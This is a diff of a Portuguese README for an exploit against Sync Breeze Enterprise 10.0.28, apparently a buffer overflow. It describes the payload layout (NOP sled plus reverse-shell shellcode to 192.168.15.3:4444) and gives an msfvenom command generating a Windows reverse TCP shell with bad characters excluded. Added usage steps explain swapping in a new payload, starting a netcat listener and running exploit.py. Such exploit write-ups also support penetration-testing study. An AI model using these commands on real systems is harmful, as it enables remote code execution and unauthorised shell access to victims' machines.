@@ -12,7 +12,21 @@ http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe
 - 16 No-Operations para garantir a perfeita execução do payload.
 - 351 bytes de payload para realizar a conexão reversa com 192.168.15.3:4444.
 
-## Gerando o mesmo payload no MSFVENOM
+## Gerando o mesmo payload no MSFVENOM:
 ```
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.3 lport=4444 exitfunc=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
+```
+
+## Como usar:
+
+É necessário gerar um novo payload de acordo com o IP e porta que deseja receber a conexão reversa.
+
+Após substituir no script prepare para receber a conexão.
+```
+nc -vnlp 4444
+```
+
+Execute o exploit:
+```
+python2 exploit.py
 ```
